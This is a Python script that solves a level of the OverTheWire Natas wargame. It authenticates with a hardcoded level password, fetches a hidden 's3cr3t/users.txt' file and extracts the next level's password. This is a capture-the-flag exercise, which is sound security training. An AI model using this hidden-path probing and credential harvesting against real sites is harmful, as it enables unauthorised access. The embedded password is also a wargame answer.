import requests
import re

username = "natas3"
password = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"
url = "http://%s.natas.labs.overthewire.org/"  % username

response = requests.get(url, auth=(username,password))
pageContent = response.text
print(pageContent)
print("="*50)

secret_path = "s3cr3t/users.txt"
response = requests.get(url+secret_path,auth=(username,password))
print("\nThe password for the next level is: " + re.findall(r"natas4:(.*)",response.text)[0])